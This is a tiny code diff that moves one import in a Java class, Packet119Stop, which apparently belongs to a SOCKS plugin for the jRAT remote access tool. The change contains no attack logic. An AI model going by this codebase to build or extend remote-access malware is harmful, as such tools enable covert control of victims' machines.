@@ -4,8 +4,8 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
 import se.jrat.plugins.socks.Global;
-import jrat.api.PacketBuilder;
 import jrat.api.Client;
+import jrat.api.net.PacketBuilder;
 
 public class Packet119Stop extends PacketBuilder {
 
